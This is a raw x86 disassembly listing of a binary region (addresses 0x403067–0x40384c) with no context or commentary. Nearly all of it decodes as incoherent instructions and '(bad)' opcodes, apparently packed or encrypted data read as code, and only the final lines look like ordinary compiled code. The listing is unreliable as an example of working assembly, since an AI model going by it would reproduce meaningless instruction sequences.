  403067:	scas   al,BYTE PTR es:[edi]
  403068:	jo     0x4030be
  40306a:	lds    ecx,FWORD PTR [esi-0x7d739ab8]
  403070:	dec    bh
  403072:	test   BYTE PTR [esi+edi*2-0x50],ch
  403076:	aad    0x47
  403078:	je     0x4030b6
  40307a:	out    dx,eax
  40307b:	and    eax,0xe7577325
  403080:	pop    es
  403081:	fadd   QWORD PTR [ebx+ebp*8-0x5dc67df0]
  403088:	aam    0x13
  40308a:	mov    ebp,eax
  40308c:	lahf   
  40308d:	aad    0x54
  40308f:	push   ecx
  403090:	je     0x4030b2
  403092:	and    esp,DWORD PTR [eax+0x1d5a60b7]
  403098:	sar    DWORD PTR [ebx-0x5f],cl
  40309b:	outs   dx,BYTE PTR ds:[esi]
  40309c:	dec    ebx
  40309d:	or     al,0x83
  40309f:	xor    eax,0x2f3f0376
  4030a4:	ins    BYTE PTR es:[edi],dx
  4030a5:	or     eax,0x254958e4
  4030aa:	sbb    BYTE PTR [esi-0x4e0c4745],dh
  4030b0:	sub    eax,0x54e1301c
  4030b5:	mov    ch,0xca
  4030b7:	cmp    ah,BYTE PTR [edi-0x1cddbbc8]
  4030bd:	shr    BYTE PTR [esi+ebx*4],1
  4030c0:	push   ecx
  4030c1:	push   es
  4030c2:	out    0xc7,al
  4030c4:	hlt    
  4030c5:	shr    DWORD PTR [edi-0x2a9d0092],cl
  4030cb:	mov    bl,0x35
  4030cd:	retf   
  4030ce:	mov    al,ds:0x7351d3cd
  4030d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030d4:	not    BYTE PTR [ecx]
  4030d6:	fcmovnb st,st(3)
  4030d8:	sar    DWORD PTR [ecx-0x63],1
  4030db:	dec    ecx
  4030dc:	cli    
  4030dd:	mov    ds:0x9bb71202,al
  4030e2:	adc    al,0x15
  4030e4:	sub    BYTE PTR [ecx],cl
  4030e6:	ins    DWORD PTR es:[edi],dx
  4030e7:	mov    ah,0xb9
  4030e9:	iret   
  4030ea:	add    bh,BYTE PTR [ecx-0x3bd7b4a0]
  4030f0:	js     0x4030d7
  4030f2:	inc    ebx
  4030f3:	adc    DWORD PTR [ebx],0x46c25ad
  4030f9:	(bad)  
  4030fb:	(bad)  
  4030fc:	mov    ah,0x76
  4030fe:	mov    bl,0xb0
  403100:	cwd    
  403102:	enter  0x5821,0x73
  403106:	loop   0x4030c8
  403108:	repz sub eax,0xbcb5e1ab
  40310e:	js     0x4030e2
  403110:	or     esp,edx
  403112:	xor    eax,0x4037b1e
  403117:	ss das 
  403119:	sub    BYTE PTR [edx],dh
  40311b:	jno    0x4030e7
  40311d:	int3   
  40311e:	das    
  40311f:	add    eax,ebp
  403121:	lds    ebp,FWORD PTR [eax-0x1fa49292]
  403127:	push   es
  403128:	xor    dl,BYTE PTR [edi]
  40312a:	int3   
  40312b:	outs   dx,DWORD PTR ds:[esi]
  40312c:	lods   al,BYTE PTR ds:[esi]
  40312d:	add    al,0xe4
  40312f:	pusha  
  403130:	data16 cs mov al,0x9d
  403134:	cmp    cl,al
  403136:	stc    
  403137:	call   0xc259:0x9f730295
  40313e:	and    DWORD PTR [ebp+0x4a915440],esi
  403144:	sbb    eax,0xcc280896
  403149:	cmp    BYTE PTR [eax+0x58],dl
  40314c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40314d:	sub    eax,0x9689337e
  403152:	sbb    eax,0x4c43e685
  403157:	and    BYTE PTR [eax+0x7b4ee4c1],dh
  40315d:	fst    QWORD PTR [eax+0x1c]
  403160:	out    0xf0,eax
  403162:	sbb    BYTE PTR [esi+0x18],bh
  403165:	popf   
  403166:	jg     0x403106
  403168:	push   ecx
  403169:	xor    eax,0x29392efe
  40316e:	ss add eax,0x87631a58
  403174:	imul   ecx,DWORD PTR [ebx+0x59abeb5d],0x5d
  40317b:	leave  
  40317c:	retf   
  40317d:	xchg   ebp,eax
  40317e:	push   cs
  40317f:	adc    DWORD PTR [edx],ecx
  403181:	xchg   ecx,eax
  403182:	lods   eax,DWORD PTR ds:[esi]
  403183:	jo     0x40311c
  403185:	cld    
  403186:	sbb    eax,0x29d59424
  40318b:	dec    ebp
  40318c:	dec    edx
  40318d:	push   ebp
  40318e:	stos   BYTE PTR es:[edi],al
  40318f:	cli    
  403190:	xchg   BYTE PTR [ebp-0x48299c5f],ch
  403196:	mov    edx,DWORD PTR [esi]
  403198:	push   ss
  403199:	rep outs dx,BYTE PTR ds:[esi]
  40319b:	jns    0x4031bf
  40319d:	jne    0x403130
  40319f:	enter  0x2b2e,0xbe
  4031a3:	sub    ebp,DWORD PTR [edi+0x5e520666]
  4031a9:	aad    0xc5
  4031ab:	sbb    ecx,DWORD PTR [ebx+0x7db59525]
  4031b1:	mov    ch,0x66
  4031b3:	dec    ebx
  4031b4:	gs xchg ecx,eax
  4031b6:	test   al,0x4b
  4031b8:	sub    eax,0x2cb743a5
  4031bd:	clc    
  4031be:	mul    BYTE PTR [ecx+0x31]
  4031c1:	out    dx,eax
  4031c2:	loop   0x403155
  4031c4:	icebp  
  4031c5:	jg     0x4031bf
  4031c7:	adc    ebp,DWORD PTR [esi]
  4031c9:	xor    eax,0x4357f472
  4031ce:	cmp    al,0xc0
  4031d0:	mov    ebx,0x510e566d
  4031d5:	xchg   esp,eax
  4031d6:	jle    0x40319e
  4031d8:	mov    bl,0xad
  4031da:	sub    al,0x7c
  4031dc:	add    al,0x20
  4031de:	ins    BYTE PTR es:[edi],dx
  4031df:	sbb    ah,ah
  4031e1:	xchg   esi,eax
  4031e2:	das    
  4031e3:	inc    esp
  4031e4:	aaa    
  4031e5:	xor    al,0x1a
  4031e7:	sbb    ah,0x17
  4031ea:	or     DWORD PTR [edi+0x6b],ecx
  4031ed:	jns    0x4031b8
  4031ef:	push   edx
  4031f0:	sbb    eax,0xecd51c5c
  4031f5:	jecxz  0x4031c0
  4031f7:	sbb    eax,DWORD PTR [ebp-0x4a1358ea]
  4031fd:	test   ebp,0xa8de1849
  403203:	cmp    BYTE PTR [edx-0x6f],bh
  403206:	mov    ds:0x84af4721,eax
  40320b:	and    ebp,DWORD PTR [edi+0x24]
  40320e:	dec    esp
  40320f:	loope  0x40319b
  403211:	pop    edi
  403212:	in     al,0x22
  403214:	sub    ah,BYTE PTR [edi]
  403216:	xchg   esp,eax
  403217:	jno    0x403285
  403219:	jnp    0x40323d
  40321b:	xor    BYTE PTR [ebx-0x7f262b9],al
  403221:	jnp    0x40329c
  403223:	mov    edx,0x84346ebc
  403228:	sbb    BYTE PTR [ecx-0x2385a3c4],al
  40322e:	pushf  
  40322f:	xchg   edx,eax
  403230:	lods   al,BYTE PTR ds:[esi]
  403231:	icebp  
  403232:	fiadd  WORD PTR [edx-0x1d]
  403235:	in     al,0x6a
  403237:	xor    DWORD PTR ss:[edi+ebp*1+0x5a],0x3d
  40323d:	jmp    0x2b11:0x60507a8f
  403244:	das    
  403245:	jge    0x40327a
  403247:	jg     0x40328d
  403249:	jmp    0xb20b7cfd
  40324e:	add    eax,0x593bb0d8
  403253:	xchg   edx,eax
  403254:	lds    edi,FWORD PTR [eax+esi*8]
  403257:	(bad)  
  403258:	adc    esp,DWORD PTR [edx+esi*1-0x71ff180b]
  40325f:	adc    ah,BYTE PTR [esp+ebx*8-0x1e1623d1]
  403266:	add    al,0x6b
  403268:	or     DWORD PTR [edi+0x6b],0xd6a3a8ee
  40326f:	(bad)  
  403270:	out    dx,eax
  403271:	and    BYTE PTR [ebp+0x71288ecc],ah
  403277:	fstp   TBYTE PTR [eax+0x76]
  40327a:	je     0x403224
  40327c:	aam    0xa4
  40327e:	cmp    ah,BYTE PTR [esi+edi*2+0x2]
  403282:	out    dx,eax
  403283:	pop    ecx
  403284:	imul   edx,DWORD PTR [edx+ebx*1-0x422f5f37],0x86e0dfd0
  40328f:	idiv   ecx
  403291:	test   DWORD PTR [ebp+ebp*8+0x5c],esp
  403295:	dec    ebx
  403296:	xchg   ebx,eax
  403297:	jl     0x403312
  403299:	cmp    eax,0x6d58d12d
  40329e:	inc    esp
  40329f:	cli    
  4032a0:	push   esp
  4032a1:	not    DWORD PTR [edx+0x68]
  4032a4:	mov    ebx,0xaf717e1f
  4032a9:	not    DWORD PTR [ebx-0x70]
  4032ac:	mov    ds:0xf6b598a4,al
  4032b1:	in     eax,dx
  4032b2:	ret    
  4032b3:	ins    DWORD PTR es:[edi],dx
  4032b4:	jle    0x40325f
  4032b6:	xor    dh,al
  4032b8:	pop    esp
  4032b9:	addr16 and al,0x56
  4032bc:	mov    bh,0x9a
  4032be:	out    dx,eax
  4032bf:	jmp    0x10ec:0x53ff8acb
  4032c6:	mov    ah,0xed
  4032c8:	dec    edx
  4032c9:	hlt    
  4032ca:	loopne 0x403315
  4032cc:	mov    ah,0x9e
  4032ce:	and    ch,BYTE PTR [edx]
  4032d0:	jge    0x4032a6
  4032d2:	add    DWORD PTR [edx+0x35],0x38
  4032d6:	mov    cx,0x2773
  4032da:	jp     0x403279
  4032dc:	sahf   
  4032dd:	dec    ebp
  4032de:	or     BYTE PTR [edi],bl
  4032e0:	scas   al,BYTE PTR es:[edi]
  4032e1:	adc    dl,ah
  4032e3:	dec    esp
  4032e4:	push   0x79966bb
  4032e9:	imul   edi,ebp,0x6b0e7beb
  4032ef:	inc    edi
  4032f0:	xor    al,dh
  4032f2:	mov    WORD PTR [ebp+0x44],es
  4032f5:	mov    al,0x28
  4032f7:	add    DWORD PTR [ebp-0x2],ebp
  4032fa:	sbb    BYTE PTR [eax],0x18
  4032fd:	cli    
  4032fe:	fnstsw WORD PTR [ecx-0x13]
  403301:	leave  
  403302:	or     al,BYTE PTR ds:0x650b8a6f
  403308:	adc    esi,DWORD PTR [eax-0x5da0f35e]
  40330e:	or     al,BYTE PTR [edi+0x36]
  403311:	loop   0x403312
  403313:	int    0x5b
  403315:	pop    es
  403316:	add    BYTE PTR [ebx-0x14],ch
  403319:	aad    0x33
  40331b:	adc    eax,0x79e528ff
  403320:	lea    esp,ds:0xde435ee3
  403326:	sbb    BYTE PTR ds:[edx+0x6b],ah
  40332a:	pop    eax
  40332b:	dec    esi
  40332c:	push   es
  40332d:	inc    ecx
  40332e:	popa   
  40332f:	push   ds
  403330:	shl    DWORD PTR [ebx],cl
  403332:	inc    edi
  403333:	push   ss
  403334:	adc    al,0x4
  403336:	mov    esp,0xe4408d1d
  40333b:	pop    edx
  40333c:	fs out dx,al
  40333e:	(bad)  
  40333f:	push   0xffffff9c
  403341:	cdq    
  403342:	push   ds
  403343:	inc    ebp
  403344:	jge    0x403393
  403346:	xlat   BYTE PTR ds:[ebx]
  403347:	and    eax,0xde2eab53
  40334c:	adc    ebx,0x26
  40334f:	addr16 and ebp,edx
  403352:	ds daa 
  403354:	jge    0x40330c
  403356:	xor    al,0xa6
  403358:	ds jno 0x403395
  40335b:	test   al,0xb1
  40335d:	xchg   esi,eax
  40335e:	mov    eax,ds:0x914b3ac6
  403363:	shr    BYTE PTR [ebx+0x4554b5a8],cl
  403369:	sub    BYTE PTR [edx-0x496ccfab],dl
  40336f:	fstp   DWORD PTR [ebp+0x39]
  403372:	(bad)
  403376:	jle    0x403389
  403378:	js     0x403355
  40337a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40337b:	(bad)  
  40337c:	arpl   WORD PTR [edx],bx
  40337e:	in     al,0x8c
  403380:	mov    ds:0x84c29e29,al
  403385:	shr    DWORD PTR [ecx+0x28],1
  403388:	mov    ch,0x6e
  40338a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40338b:	inc    ecx
  40338c:	idiv   BYTE PTR [eax+0x6f]
  40338f:	(bad)  
  403390:	sti    
  403391:	xchg   dh,dh
  403393:	xor    bl,cl
  403395:	test   al,ch
  403397:	mov    ecx,0xd1bda82e
  40339c:	stos   DWORD PTR es:[edi],eax
  40339d:	push   esi
  40339e:	push   edi
  40339f:	adc    al,0xb4
  4033a1:	mov    edx,0xd41de87f
  4033a6:	and    al,0xef
  4033a8:	push   es
  4033a9:	js     0x403371
  4033ab:	mov    ebp,0x9b43f94d
  4033b0:	push   edi
  4033b1:	pop    ecx
  4033b2:	cs push eax
  4033b4:	rcr    BYTE PTR [edi+0x54],0xe9
  4033b8:	aaa    
  4033b9:	dec    ecx
  4033ba:	les    esp,FWORD PTR [ecx+0x1c04d841]
  4033c0:	sahf   
  4033c1:	pop    ss
  4033c2:	push   edx
  4033c3:	push   esi
  4033c4:	inc    edx
  4033c5:	ja     0x403355
  4033c7:	and    al,0xdb
  4033c9:	sbb    esp,DWORD PTR [edx]
  4033cb:	xchg   ebp,eax
  4033cc:	pushf  
  4033cd:	inc    edx
  4033ce:	test   ah,al
  4033d0:	mov    edx,0x40353717
  4033d5:	dec    edx
  4033d6:	jle    0x40344e
  4033d8:	mov    bh,0xed
  4033da:	ret    
  4033db:	jb     0x4033fe
  4033dd:	sti    
  4033de:	(bad)  
  4033e0:	dec    esp
  4033e1:	jl     0x403398
  4033e3:	clc    
  4033e4:	or     dl,BYTE PTR ds:0xad14b8cb
  4033ea:	pusha  
  4033eb:	sbb    eax,0x506bbe73
  4033f0:	pop    ds
  4033f1:	and    BYTE PTR [ecx+edx*8+0x2f4722d5],ch
  4033f8:	sar    DWORD PTR [edx],1
  4033fa:	bnd jnp 0x4033a8
  4033fd:	ficom  DWORD PTR [ebx]
  4033ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403400:	mov    esp,0x883c5327
  403405:	jo     0x40346d
  403407:	and    al,0x68
  403409:	ret    
  40340a:	pop    edx
  40340b:	or     ebx,DWORD PTR [ecx]
  40340d:	and    DWORD PTR [eax-0x4f],0xffffffcc
  403411:	mov    ebx,0x2130e0d9
  403416:	jmp    0x403458
  403418:	push   ebx
  403419:	sub    esp,DWORD PTR [ebx+0x4282b02e]
  40341f:	pop    edi
  403420:	jb     0x403413
  403422:	adc    al,0x8
  403424:	gs add edi,edx
  403427:	icebp  
  403428:	inc    ebp
  403429:	and    ah,BYTE PTR [ebx+0x57acbc24]
  40342f:	push   esi
  403430:	mov    dh,0xb3
  403432:	repnz sbb cl,BYTE PTR [ebp+0x3b3a6d5a]
  403439:	pop    ecx
  40343a:	mov    ds:0xf76a896f,eax
  40343f:	jp     0x4033f4
  403441:	pop    edi
  403442:	jnp    0x403481
  403444:	or     eax,0x54cf1d03
  403449:	loopne 0x40349f
  40344b:	scas   eax,DWORD PTR es:[edi]
  40344c:	push   0x2d
  40344e:	inc    eax
  40344f:	mov    dh,0xdc
  403451:	mov    cl,BYTE PTR [eax-0x70]
  403454:	addr16 or al,0xec
  403457:	xchg   edx,eax
  403458:	add    edx,DWORD PTR [ecx]
  40345a:	int3   
  40345b:	in     al,0x14
  40345d:	lahf   
  40345e:	jnp    0x403448
  403460:	out    dx,eax
  403461:	cwde   
  403462:	inc    esi
  403463:	jl     0x4033fb
  403465:	cmp    bl,BYTE PTR [esi+0x3a]
  403468:	dec    edi
  403469:	rcl    BYTE PTR [edi-0x41a33c0],cl
  40346f:	pusha  
  403470:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403471:	cmp    ebx,DWORD PTR [edi-0x6a]
  403474:	int    0xb
  403476:	cmp    DWORD PTR [eax-0x17e387f0],esi
  40347c:	xor    al,dl
  40347e:	fcomi  st,st(0)
  403480:	mov    ds:0xc0d284ba,eax
  403485:	mov    ebx,0x2c71c574
  40348a:	jle    0x403412
  40348c:	aas    
  40348d:	jp     0x4034a2
  40348f:	lds    edx,FWORD PTR [edx+eiz*2-0x380e91f1]
  403496:	sbb    DWORD PTR ds:0x585d5aa1,edi
  40349c:	dec    edx
  40349d:	push   esp
  40349e:	daa    
  40349f:	das    
  4034a0:	push   ss
  4034a1:	jmp    0xd7d33c63
  4034a6:	pop    esp
  4034a7:	paddsw mm7,QWORD PTR [esp+ebp*1-0x43]
  4034ac:	xchg   ecx,eax
  4034ad:	jns    0x403502
  4034af:	aaa    
  4034b0:	ins    DWORD PTR es:[edi],dx
  4034b1:	jo     0x4034b5
  4034b3:	fstp   QWORD PTR [edi]
  4034b5:	pop    ss
  4034b6:	out    dx,eax
  4034b7:	cdq    
  4034b8:	sbb    ecx,DWORD PTR [ebx]
  4034ba:	icebp  
  4034bb:	mov    edi,0x20360664
  4034c0:	lock add DWORD PTR [edi-0x28],edi
  4034c4:	cli    
  4034c5:	xchg   edi,eax
  4034c6:	jns    0x4034d3
  4034c8:	mov    al,0xce
  4034ca:	das    
  4034cb:	dec    ecx
  4034cc:	popa   
  4034cd:	mov    dh,0x44
  4034cf:	jmp    FWORD PTR [ebx]
  4034d1:	jl     0x4034ac
  4034d3:	data16 jns 0x4034d0
  4034d6:	adc    dh,BYTE PTR [esi+0x2a2a978c]
  4034dc:	out    dx,eax
  4034dd:	add    al,0xf9
  4034df:	push   ss
  4034e0:	outs   dx,BYTE PTR ds:[esi]
  4034e1:	push   ecx
  4034e2:	xor    DWORD PTR [eax],edi
  4034e4:	enter  0x7903,0x49
  4034e8:	arpl   WORD PTR [eax+0x49b091e],bx
  4034ee:	cmc    
  4034ef:	leave  
  4034f0:	pushf  
  4034f1:	fsubr  QWORD PTR [eax+eiz*2+0x38a63b59]
  4034f8:	cli    
  4034f9:	add    eax,0x5acffa42
  4034fe:	push   0xd75f4c50
  403503:	aaa    
  403504:	xchg   ebp,eax
  403505:	in     eax,dx
  403506:	imul   eax,esp,0x99e82c3c
  40350c:	out    dx,al
  40350d:	xchg   ecx,eax
  40350e:	fild   WORD PTR [edi]
  403510:	cmc    
  403511:	retf   0xd149
  403514:	mov    BYTE PTR [edi],0xd7
  403517:	xor    DWORD PTR [esi+0x4a],0xb9277550
  40351e:	aam    0xc2
  403520:	jne    0x40353e
  403522:	mov    edx,fs
  403524:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403525:	and    DWORD PTR [edx+0x25],eax
  403528:	in     al,0x35
  40352a:	fnstcw WORD PTR [ebp+0x71]
  40352d:	jo     0x40356b
  40352f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403530:	pop    edi
  403531:	push   ds
  403532:	cmp    bh,cl
  403534:	(bad)  
  403536:	add    eax,0x3dab6bd6
  40353b:	inc    ebp
  40353c:	push   ss
  40353d:	bound  esp,QWORD PTR [edx+0x634373cf]
  403543:	fstp   DWORD PTR [ecx]
  403545:	(bad)  
  403546:	push   ebp
  403547:	push   esi
  403548:	sbb    dl,ah
  40354a:	arpl   ax,bp
  40354c:	and    edi,DWORD PTR [esi-0x27]
  40354f:	(bad)  
  403550:	out    0x3d,eax
  403552:	in     eax,0x3f
  403554:	mov    eax,ds:0xe550ff00
  403559:	into   
  40355a:	dec    edi
  40355b:	stos   BYTE PTR es:[edi],al
  40355c:	push   esi
  40355d:	not    DWORD PTR [esi+0x16]
  403560:	pop    ebp
  403561:	into   
  403562:	adc    BYTE PTR [ebp+0x39],ah
  403565:	sub    BYTE PTR [ebp-0x6e],ah
  403568:	(bad)  
  403569:	sahf   
  40356a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40356b:	add    al,0xa8
  40356d:	test   esi,ecx
  40356f:	lods   al,BYTE PTR ds:[esi]
  403570:	test   eax,0x89ddc1c4
  403575:	jl     0x4035d5
  403577:	cmp    al,BYTE PTR [edx+0x9]
  40357a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40357b:	jns    0x23da075
  403581:	mov    dl,0x9f
  403583:	outs   dx,BYTE PTR ds:[esi]
  403584:	in     eax,dx
  403585:	or     al,0x4b
  403587:	outs   dx,BYTE PTR ds:[esi]
  403588:	lods   eax,DWORD PTR ds:[esi]
  403589:	(bad)  
  40358b:	sub    esi,ebp
  40358d:	aad    0x78
  40358f:	rcr    DWORD PTR [eax+0x2f],1
  403592:	fild   QWORD PTR [ebx]
  403594:	mov    ah,0xe8
  403596:	mov    BYTE PTR [edi+0x6e],al
  403599:	mov    eax,ds:0x7e4ef255
  40359e:	mov    ecx,0x8cd061ca
  4035a3:	sar    DWORD PTR [ebp-0x502c211f],1
  4035a9:	mov    bh,0x41
  4035ab:	popa   
  4035ac:	imul   ecx,ecx,0x4
  4035af:	lock pop es
  4035b1:	data16 xor al,0x89
  4035b4:	sub    edx,ebp
  4035b6:	jns    0x403560
  4035b8:	cmp    esp,DWORD PTR [ebx]
  4035ba:	adc    BYTE PTR [edi],0x67
  4035bd:	adc    al,0xd2
  4035bf:	jecxz  0x4035a9
  4035c1:	call   0xce16:0xaa3e51f5
  4035c8:	pop    esi
  4035c9:	mov    edx,0x92dceea1
  4035ce:	xchg   ecx,eax
  4035cf:	nop
  4035d0:	sbb    al,0x96
  4035d2:	mov    edx,0x9a9e2752
  4035d7:	fidivr DWORD PTR [edx+esi*2]
  4035da:	xor    BYTE PTR [eax],0x6b
  4035dd:	xor    BYTE PTR [esi],dh
  4035df:	(bad)  
  4035e0:	je     0x403579
  4035e2:	sub    bl,dl
  4035e4:	scas   eax,DWORD PTR es:[edi]
  4035e5:	xor    BYTE PTR [ebx-0x7],ch
  4035e8:	repz or ebx,DWORD PTR [eax-0x20]
  4035ec:	repz test eax,0xe1412180
  4035f2:	std    
  4035f3:	cmp    esi,edx
  4035f5:	xchg   esp,eax
  4035f6:	adc    al,0x72
  4035f8:	mov    bl,0xbb
  4035fa:	adc    eax,DWORD PTR [esi]
  4035fc:	xchg   ebp,eax
  4035fd:	loop   0x403596
  4035ff:	hlt    
  403600:	mov    ebx,0xcd1a1d87
  403605:	push   ecx
  403606:	mov    ds:0x8cdb170e,al
  40360b:	xchg   ecx,eax
  40360c:	push   ebp
  40360d:	mov    edx,0xb21f7f40
  403612:	cmp    BYTE PTR [edi],ch
  403614:	lahf   
  403615:	pop    esi
  403616:	outs   dx,BYTE PTR ds:[esi]
  403617:	aam    0x40
  403619:	ror    BYTE PTR [ebx],0xf1
  40361c:	dec    edi
  40361d:	imul   ecx,eax,0xffffffe9
  403620:	jecxz  0x403674
  403622:	mov    esi,0xb1dc232e
  403627:	push   edx
  403628:	push   ebx
  403629:	pop    ds
  40362a:	cs repnz clc 
  40362d:	test   DWORD PTR [ecx-0x53],ebp
  403630:	fisttp QWORD PTR [edi-0x65ab03e2]
  403636:	data16 cli 
  403638:	(bad)  
  403639:	or     eax,0x9b13e3fe
  40363e:	or     esp,DWORD PTR ds:0x6435676c
  403644:	loopne 0x4036bc
  403646:	shl    BYTE PTR [ecx-0x35b172cb],1
  40364c:	(bad)  
  40364d:	leave  
  40364e:	popf   
  40364f:	mov    ecx,0x86237abb
  403654:	add    BYTE PTR [esi+esi*1-0x2bd8b9c4],0xef
  40365c:	mov    esp,DWORD PTR [ebp+0x6b]
  40365f:	call   0x14ba9acf
  403664:	loope  0x4036b7
  403666:	mov    al,ds:0x8988b2dc
  40366b:	mov    cl,0x91
  40366d:	cmp    eax,0x6645a1c6
  403672:	loopne 0x40361e
  403674:	inc    esp
  403675:	dec    esp
  403676:	xor    BYTE PTR ss:[edi+0x523f6d3],cl
  40367d:	and    esi,DWORD PTR [ebx]
  40367f:	outs   dx,BYTE PTR ds:[esi]
  403680:	add    DWORD PTR [edx+eiz*1-0x16c7abc8],edx
  403687:	(bad)  
  403688:	iret   
  403689:	cli    
  40368a:	adc    DWORD PTR [ecx+edi*2+0x3b],0xf2e651ad
  403692:	xchg   ebp,eax
  403693:	inc    edi
  403694:	loopne 0x4036f5
  403696:	mov    ebp,0x1789348f
  40369b:	sbb    eax,0x26b67b3b
  4036a0:	(bad)  
  4036a1:	sub    bh,BYTE PTR [eax+ecx*1+0x4d]
  4036a5:	push   ds
  4036a6:	ret    
  4036a7:	out    0x91,al
  4036a9:	mul    bh
  4036ab:	pop    ebp
  4036ac:	fst    DWORD PTR [ecx-0x1f]
  4036af:	int3   
  4036b0:	mul    bh
  4036b2:	cmp    BYTE PTR [edx+0x56],al
  4036b5:	add    BYTE PTR [ecx],cl
  4036b7:	into   
  4036b8:	mov    edx,0x382186ca
  4036bd:	(bad)  
  4036be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036bf:	cli    
  4036c0:	pop    ebx
  4036c1:	cli    
  4036c2:	lods   eax,DWORD PTR ds:[esi]
  4036c3:	rcl    ebx,0x1
  4036c6:	push   esi
  4036c7:	fwait
  4036c8:	lods   eax,DWORD PTR ds:[esi]
  4036c9:	stos   BYTE PTR es:[edi],al
  4036ca:	(bad)  
  4036cb:	sub    cl,cl
  4036cd:	and    DWORD PTR ds:[eax-0x35],edi
  4036d1:	jmp    0x67e112c1
  4036d6:	pop    ecx
  4036d7:	mov    esp,0x398d5f4d
  4036dc:	push   0xc6f9cfb8
  4036e1:	inc    esp
  4036e2:	(bad)  
  4036e4:	jmp    0x8e58:0xc0912f6d
  4036eb:	das    
  4036ec:	lock js 0x403701
  4036ef:	jg     0x1eea90cc
  4036f5:	pop    ds
  4036f6:	push   esi
  4036f7:	cdq    
  4036f8:	dec    esi
  4036f9:	ja     0x40374e
  4036fb:	pop    eax
  4036fc:	mov    edi,0x3ed1fbf2
  403701:	daa    
  403702:	jno    0x403709
  403704:	mov    ebx,0x5fc15585
  403709:	loopne 0x40369b
  40370b:	test   DWORD PTR [ecx+0x1a173eb],eax
  403711:	sub    DWORD PTR [esi],0x11
  403714:	push   ebx
  403715:	ret    0x3a1c
  403718:	shr    BYTE PTR [esi],cl
  40371a:	jbe    0x40375f
  40371c:	and    DWORD PTR [eax],esp
  40371e:	retf   0x1e3d
  403721:	mov    edx,0x9eb7cadc
  403726:	and    BYTE PTR [edi-0x25d46732],bl
  40372c:	xchg   BYTE PTR [ebx+0x604f4059],cl
  403732:	js     0x4036ff
  403734:	xor    DWORD PTR [ecx+0x6c],edi
  403737:	push   0x53273088
  40373c:	xchg   ecx,eax
  40373d:	mov    ah,0xa6
  40373f:	and    BYTE PTR [esi+eiz*1],0xc
  403743:	idiv   ch
  403745:	aaa    
  403746:	int    0x43
  403748:	xchg   esi,ebp
  40374a:	outs   dx,BYTE PTR ds:[esi]
  40374b:	xor    eax,0x706591a5
  403750:	add    al,0xf7
  403752:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403753:	fnsave [ebx-0x2afd4305]
  403759:	or     al,0x28
  40375b:	pop    ebp
  40375c:	in     al,dx
  40375d:	push   DWORD PTR [edx-0x6f77baab]
  403763:	lock sbb ch,BYTE PTR [ecx-0xaef24b2]
  40376a:	sub    esi,ecx
  40376c:	mov    al,ds:0xe0f3947f
  403771:	jnp    0x4037db
  403773:	jne    0x4037cb
  403775:	(bad)  
  403776:	mov    esi,0xc962c572
  40377b:	pop    eax
  40377c:	inc    esp
  40377d:	push   ebp
  40377e:	and    al,0x20
  403780:	or     eax,0x686cee06
  403785:	sti    
  403786:	pop    edi
  403787:	stos   DWORD PTR es:[edi],eax
  403788:	shl    DWORD PTR [edi-0x5eaf9dad],0x4f
  40378f:	mov    BYTE PTR [ecx+0x12],ah
  403792:	jl     0x403771
  403794:	dec    edx
  403795:	stos   DWORD PTR es:[edi],eax
  403796:	ins    DWORD PTR es:[edi],dx
  403797:	xchg   ebx,eax
  403798:	ss pop es
  40379a:	or     edi,ebp
  40379c:	push   ebp
  40379d:	fimul  DWORD PTR [esi+0x55b81d90]
  4037a3:	dec    ebp
  4037a4:	mul    DWORD PTR ds:[ebx]
  4037a7:	inc    esp
  4037a8:	outs   dx,DWORD PTR ds:[esi]
  4037a9:	mov    al,ds:0xa1469cf9
  4037ae:	and    dl,BYTE PTR [eax]
  4037b0:	fnstcw WORD PTR [edx+0x5e]
  4037b3:	mov    ecx,DWORD PTR [eax]
  4037b5:	jb     0x4037d3
  4037b7:	sub    esp,DWORD PTR [edx-0x67cdd9e6]
  4037bd:	mov    edi,0x1f9f1f8c
  4037c2:	add    DWORD PTR [eax-0x5881c831],esp
  4037c8:	mov    ebx,0x80f96ac6
  4037cd:	jl     0x4037aa
  4037cf:	lods   al,BYTE PTR ds:[esi]
  4037d0:	xchg   esi,eax
  4037d1:	dec    ebx
  4037d2:	arpl   WORD PTR [eax],di
  4037d4:	shl    BYTE PTR [edx-0xc0b5191],0x99
  4037db:	mov    ebp,0x6f14d6e9
  4037e0:	test   eax,0xd372ccaf
  4037e5:	pop    ebp
  4037e6:	or     bl,BYTE PTR [edi+edx*4+0x1cbd6391]
  4037ed:	sub    eax,0x1766fe8
  4037f2:	add    BYTE PTR [ebp+0x2b840fc0],al
  4037f8:	add    BYTE PTR [eax],al
  4037fa:	add    BYTE PTR [ebp-0x8f7b],cl
  403800:	call   DWORD PTR [eax-0x75]
  403803:	inc    ebp
  403804:	shl    BYTE PTR [ebx],1
  403806:	mov    BYTE PTR [ebx],0xc7
  403809:	push   eax
  40380a:	mov    eax,DWORD PTR [ebp-0x2c]
  40380d:	add    eax,0xaa
  403812:	push   eax
  403813:	mov    eax,DWORD PTR [ebp-0x2c]
  403816:	mov    eax,DWORD PTR [eax+0x198]
  40381c:	push   DWORD PTR [eax]
  40381e:	call   0x405c89
  403823:	mov    DWORD PTR [ebp-0x40],eax
  403826:	lea    eax,[ebp+0x4]
  403829:	mov    DWORD PTR [ebp-0x34],eax
  40382c:	mov    eax,DWORD PTR [ebp-0x8]
  40382f:	mov    eax,DWORD PTR [eax]
  403831:	mov    eax,DWORD PTR [eax]
  403833:	mov    eax,DWORD PTR [eax]
  403835:	test   eax,eax
  403837:	je     0x405c7a
  40383d:	lea    eax,[ebp-0xc]
  403840:	mov    DWORD PTR [ebp-0x4c],eax
  403843:	mov    eax,DWORD PTR [ebp-0x3c]
  403846:	mov    DWORD PTR [ebp-0xc],eax
  403849:	mov    eax,DWORD PTR [ebp-0x8]
  40384c:	mov    eax,DWORD PTR [eax]
